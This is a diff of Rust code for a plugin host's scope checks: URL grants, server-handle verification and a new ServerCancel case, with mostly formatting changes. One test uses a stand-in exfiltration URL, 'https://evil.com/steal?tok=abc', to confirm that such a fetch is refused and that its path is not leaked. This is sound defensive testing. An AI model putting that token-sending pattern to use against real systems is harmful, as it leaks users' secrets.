@@ -74,9 +74,13 @@ impl State {
             }
             HostFn::HttpFetch => {
                 let req = parse(func, request)?;
-                let url = req.get("url").and_then(Value::as_str).ok_or_else(|| {
-                    Refusal::BadRequest { function: name(), detail: "no `url`".into() }
-                })?;
+                let url =
+                    req.get("url")
+                        .and_then(Value::as_str)
+                        .ok_or_else(|| Refusal::BadRequest {
+                            function: name(),
+                            detail: "no `url`".into(),
+                        })?;
                 if !self.grants.allows_url(url) {
                     // The host, not the URL: an error naming the whole URL
                     // would put a path — and whatever a plugin put in a query
@@ -91,7 +95,11 @@ impl State {
                 // step is that nothing is sent. Enforced here rather than
                 // described, because the whole point of the step is reaching a
                 // peer nobody has vouched for.
-                if req.get("probeCert").and_then(Value::as_bool).unwrap_or(false) {
+                if req
+                    .get("probeCert")
+                    .and_then(Value::as_bool)
+                    .unwrap_or(false)
+                {
                     let carries = |k: &str| match req.get(k) {
                         None | Some(Value::Null) => false,
                         Some(Value::Array(a)) => !a.is_empty(),
@@ -131,6 +139,11 @@ impl State {
             // to check: the whole of the decision was `server.list`, made when
             // the binding was installed.
             HostFn::ServerList => {}
+            // Names a label this plugin chose, not a server. What it can reach
+            // is what this instance started — the app keys the registry by
+            // instance — so there is no handle here to verify and nothing a
+            // key could name that belongs to anybody else.
+            HostFn::ServerCancel => {}
             HostFn::UiPatch
             | HostFn::UiPrompt
             | HostFn::UiPickServer
@@ -147,10 +160,19 @@ impl State {
     }
 
     fn check_handle(&self, func: HostFn, req: &Value) -> Result<(), Refusal> {
-        let handle = req.get("server").and_then(Value::as_str).ok_or_else(|| {
-            Refusal::BadRequest { function: func.path(), detail: "no `server` handle".into() }
-        })?;
-        if !self.server_handles.lock().expect("poisoned").contains(handle) {
+        let handle =
+            req.get("server")
+                .and_then(Value::as_str)
+                .ok_or_else(|| Refusal::BadRequest {
+                    function: func.path(),
+                    detail: "no `server` handle".into(),
+                })?;
+        if !self
+            .server_handles
+            .lock()
+            .expect("poisoned")
+            .contains(handle)
+        {
             return Err(Refusal::OutOfScope {
                 function: func.path(),
                 detail: "server handle was not issued to this instance".into(),
@@ -167,14 +189,22 @@ impl State {
         if func != HostFn::UiPickServer {
             return;
         }
-        let Ok(value) = serde_json::from_slice::<Value>(response) else { return };
+        let Ok(value) = serde_json::from_slice::<Value>(response) else {
+            return;
+        };
         if let Some(handle) = value.get("server").and_then(Value::as_str) {
-            self.server_handles.lock().expect("poisoned").insert(handle.to_string());
+            self.server_handles
+                .lock()
+                .expect("poisoned")
+                .insert(handle.to_string());
         }
     }
 
     pub(crate) fn issue_handle(&self, handle: impl Into<String>) {
-        self.server_handles.lock().expect("poisoned").insert(handle.into());
+        self.server_handles
+            .lock()
+            .expect("poisoned")
+            .insert(handle.into());
     }
 }
 
@@ -225,20 +255,32 @@ mod tests {
     #[test]
     fn an_unissued_server_handle_is_out_of_scope() {
         let s = state(Grants::new([Permission::ServerExec]), &["h1"]);
-        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h1","script":"id"}"#).is_ok());
-        let err =
-            s.verify_scope(HostFn::ServerExec, br#"{"server":"h2","script":"id"}"#).unwrap_err();
+        assert!(
+            s.verify_scope(HostFn::ServerExec, br#"{"server":"h1","script":"id"}"#)
+                .is_ok()
+        );
+        let err = s
+            .verify_scope(HostFn::ServerExec, br#"{"server":"h2","script":"id"}"#)
+            .unwrap_err();
         assert!(matches!(err, Refusal::OutOfScope { .. }));
     }
 
     #[test]
     fn a_url_outside_the_pattern_is_out_of_scope_and_the_path_is_not_reported() {
         let s = state(http_grants(), &[]);
-        assert!(s.verify_scope(HostFn::HttpFetch, br#"{"url":"https://10.0.0.9/x"}"#).is_ok());
+        assert!(
+            s.verify_scope(HostFn::HttpFetch, br#"{"url":"https://10.0.0.9/x"}"#)
+                .is_ok()
+        );
         let err = s
-            .verify_scope(HostFn::HttpFetch, br#"{"url":"https://evil.com/steal?tok=abc"}"#)
+            .verify_scope(
+                HostFn::HttpFetch,
+                br#"{"url":"https://evil.com/steal?tok=abc"}"#,
+            )
             .unwrap_err();
-        let Refusal::OutOfScope { detail, .. } = &err else { panic!("{err}") };
+        let Refusal::OutOfScope { detail, .. } = &err else {
+            panic!("{err}")
+        };
         assert!(detail.contains("evil.com"));
         assert!(!detail.contains("steal"), "{detail}");
         assert!(!detail.contains("tok"), "{detail}");
@@ -328,9 +370,15 @@ mod tests {
     #[test]
     fn picking_a_server_is_what_grows_the_handle_set() {
         let s = state(Grants::new([Permission::ServerExec]), &[]);
-        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_err());
+        assert!(
+            s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#)
+                .is_err()
+        );
         s.record_response(HostFn::UiPickServer, br#"{"server":"h9"}"#);
-        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_ok());
+        assert!(
+            s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#)
+                .is_ok()
+        );
     }
 
     #[test]
@@ -338,6 +386,9 @@ mod tests {
         let s = state(Grants::new([Permission::ServerExec]), &[]);
         s.record_response(HostFn::ServerExec, br#"{"server":"h9"}"#);
         s.record_response(HostFn::StoreGet, br#"{"server":"h9"}"#);
-        assert!(s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#).is_err());
+        assert!(
+            s.verify_scope(HostFn::ServerExec, br#"{"server":"h9"}"#)
+                .is_err()
+        );
     }
 }
